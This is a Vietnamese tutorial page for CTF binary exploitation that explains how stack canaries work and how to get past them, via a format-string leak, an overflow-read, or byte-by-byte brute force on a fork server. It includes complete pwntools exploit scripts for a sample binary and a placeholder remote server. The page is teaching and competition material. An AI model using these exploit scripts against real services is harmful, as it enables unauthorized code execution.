Stack Canary

Stack canary (stack protector) = một giá trị ngẫu nhiên 8 byte đặt ngay trước saved RBP/RIP. Trước khi ret, hàm kiểm tra canary còn nguyên không — overflow ghi đè nó sẽ bị phát hiện → __stack_chk_fail → abort. Bài này: cách leak và brute canary (byte thấp luôn 0x00), số thật.

00 / TÓM TẮT 1 PHÚT

Bài này nói về cái gì?

Cơ chế: hàm có buffer lưu canary (8 byte ngẫu nhiên, lấy từ fs:0x28) tại [rbp-8]. Prologue copy vào, epilogue so lại — khác → __stack_chk_fail → abort. Byte thấp luôn là 0x00 (ngăn leak qua strcpy).

Vượt: (1) leak canary (fmt %p, overflow-read) rồi ghi lại đúng giá trị khi overflow; (2) brute từng byte trên fork server (canary không đổi giữa các fork); (3) không chạm canary — chỉ ghi đè con trỏ khác (fmt, index OOB).

Nếu chỉ nhớ một điều: canary chặn overflow tuyến tính; leak nó (rồi ghi lại) hoặc brute (fork), hoặc tránh chạm nó.

⚡ COMBAT CARD — dán chạy khi đang thi
🔎 Nhận diện

checksec → "Canary found". Hàm có mov rax,fs:0x28; mov [rbp-8],rax (prologue) & sub rax,fs:0x28; jne __stack_chk_fail (epilogue).

💧 Leak + ghi lại 
# leak canary (fmt %N$p hoặc overflow in ra):
canary = int(leak, 16)   # byte thấp = 00
# overflow: pad(canary_offset) + p64(canary) + p64(rbp) + chain
payload = b"A"*OFF_CANARY + p64(canary) + b"B"*8 + rop
🔨 Brute (fork server) 
canary = b"\x00"             # byte đầu
for pos in range(7):
  for b in range(256):
    if sống(pad + canary + bytes([b])):  # không crash = đúng
      canary += bytes([b]); break
# 8 byte, ≤256×7 ≈ 1792 lần
🧩 Không chạm canary

fmt string (ghi GOT/ret không đi qua canary) · OOB index (ghi thẳng ô đích) · ghi đè con trỏ cục bộ. Canary chỉ chặn overflow TUYẾN TÍNH trên stack.

⚠️ Nhớ

Canary byte thấp = 0x00 (p64(canary) phải đúng, không thêm null). Fork server: canary KHÔNG đổi giữa fork (brute được). exec lại mỗi lần → canary đổi, brute vô nghĩa.

01 / NỀN TẢNG BẮT BUỘC

Canary = "chim hoàng yến trong hầm mỏ"

Ví von kinh điển: thợ mỏ mang chim hoàng yến xuống hầm — chim chết (do khí độc) báo nguy trước khi người gặp họa. Stack canary tương tự: một giá trị "chim" đặt giữa buffer và saved RIP. Nếu overflow (tràn tuyến tính) ghi đè saved RIP, nó phải đi qua canary trước → canary "chết" (bị đổi) → chương trình phát hiện & abort trước khi ret vào địa chỉ độc.

// prologue (gcc -fstack-protector):
mov    rax, fs:0x28       # lấy canary từ TLS
mov    [rbp-8], rax       # lưu vào stack (ngay trước saved rbp)
// epilogue:
mov    rax, [rbp-8]
sub    rax, fs:0x28       # so với canary gốc
jne    __stack_chk_fail   # khác → abort

Định nghĩa nhanh

stack canary

8 byte ngẫu nhiên trước saved RIP.

fs:0x28

TLS, nơi lưu canary gốc.

__stack_chk_fail

Hàm abort khi canary sai.

byte thấp 0x00

Chống leak qua chuỗi (null terminator).

fork server

Canary không đổi giữa fork → brute được.

master canary

Giá trị gốc trong TLS, dùng chung luồng.

02 / VÌ SAO CÓ KỸ THUẬT

Canary chặn gì, không chặn gì

Canary chặn overflow tuyến tính (ghi đè từ buffer lan tới saved RIP). Nhưng nó không chặn: ghi tùy ý không đi qua canary (format string, OOB index, UAF), hay leak-rồi-ghi-lại. Vì vậy vượt canary là một trong những bước "điều kiện" quan trọng của Phase 2: biết đề có canary → chọn leak/brute/tránh cho phù hợp, nếu không exploit sẽ abort ngay.

03 / LAYOUT · MỤC LÕI

Vị trí canary trên stack (số thật)

rbp-0x40buf[0x40] — buffer bạn tràn
rbp-0x08canary = 0x6a3b9f2c1e4d0000 (byte thấp 00!)
rbp+0x00saved rbp
rbp+0x08saved RIP (đích overflow)

Để ghi tới saved RIP (overflow 0x48 byte từ buf), payload phải ghi lại đúng canary tại rbp-8 (offset 0x40 − 0 = 0x38 từ buf? tính kỹ):

OFF_CANARY = 0x40 - 0x8 = 0x38   # buf tại rbp-0x40, canary tại rbp-0x08
# khoảng từ buf tới canary = 0x40 - 0x8 = 0x38
payload  = b"A"*0x38        # lấp tới ngay trước canary
payload += p64(canary)       # GHI LẠI canary đúng
payload += p64(0)            # saved rbp (rác)
payload += p64(ret_addr)     # saved RIP (đích)
Byte thấp 00Canary luôn kết thúc byte thấp 0x00. Khi leak qua %p thấy 0x....00 (cuối 00) → đó là canary. p64(canary) tự chứa byte 00 — không được thêm/bớt.
04 / LEAK & BRUTE

Ba đường vượt

1

Leak qua format string

%N$p dò ô canary (cuối 00). Hoặc overflow làm lộ canary ra output (printf buf chưa null-terminate).

2

Overflow-read (fgets không null)

Ghi đè byte null cuối canary bằng non-null → printf in tiếp qua canary → leak. Rồi vòng 2 ghi lại.

3

Brute trên fork server

Canary không đổi giữa các fork → đoán từng byte: byte đúng = không crash. Byte đầu = 00. ~1792 lần.

Fork vs execBrute CHỈ được khi server fork() (con giữ canary của cha). Nếu exec/restart mỗi kết nối → canary random lại mỗi lần → brute bất khả. Kiểm bằng cách gửi payload giống nhau 2 lần: cùng kết quả → fork.
05 / TỰ TAY THỬ

Brute canary từng byte

Canary bí mật (byte đầu 00). Bấm "Auto brute" để máy dò từng byte bằng oracle crash/sống.

Canary tìm được:
Byte 0 luôn = 00. Mỗi byte thử ≤256 lần (byte đúng = không crash).

07 / EXPLOIT ĐẦY ĐỦ

Leak canary → ghi lại → ROP

// vuln.c — gcc vuln.c -o vuln -fstack-protector-all -no-pie
// printf(buf) rồi gets(buf) — leak canary qua fmt, rồi overflow
# BẢN A — leak canary qua fmt, ghi lại khi overflow, rồi ret2win/ROP.
from pwn import *
exe = ELF("./vuln", checksec=False)
p = process(exe.path)

# vòng 1: leak canary (dò offset fmt trước — vd %11$p là canary)
p.sendline(b"%11$p")
canary = int(p.recvline().strip(), 16)
assert canary & 0xff == 0              # byte thấp phải 00
log.success(f"canary = {hex(canary)}")

# vòng 2: overflow ghi LẠI canary + chain
OFF_CANARY = 0x38                        # buf → canary
pop_rdi = 0x401263; win = exe.sym.win
payload  = b"A"*OFF_CANARY
payload += p64(canary)                     # canary đúng → qua check
payload += p64(0)                          # saved rbp
payload += p64(exe.sym.win)                # saved RIP → win
p.sendline(payload)
p.interactive()
Thành thậtOffset fmt (%11$) & OFF_CANARY=0x38 là của binary mẫu — dò bằng gdb/cyclic. Canary byte thấp PHẢI 00 (assert bắt sai). Nếu leak sai ô → giá trị không kết thúc 00.
# BẢN B — brute canary trên fork server (không có fmt).
from pwn import *
HOST,PORT = "srv",1337; OFF_CANARY = 0x38

def alive(suffix):
    try:
        p = remote(HOST, PORT)
        p.send(b"A"*OFF_CANARY + suffix)
        r = p.recv(timeout=1); p.close()
        return len(r) > 0      # còn trả lời = canary đúng
    except: return False

canary = b"\x00"                       # byte đầu luôn 00
while len(canary) < 8:
    for b in range(256):
        if alive(canary + bytes([b])):
            canary += bytes([b]); log.info(canary.hex()); break
log.success(f"canary = {canary.hex()}")
# → dùng canary trong payload overflow như bản A
BruteChỉ chạy được trên fork server. ~1792 kết nối (chậm nhưng chắc). Mỗi byte đúng = server không crash (còn gửi output).
# BẢN C — pwnld.
from pwnld import *
exe = ELF("./vuln", checksec=False); p = start()
sl(b"%11$p"); canary = int(rl().strip(), 16)
assert canary & 0xff == 0
sl(b"A"*0x38 + p64(canary) + p64(0) + p64(exe.sym.win))
ia()
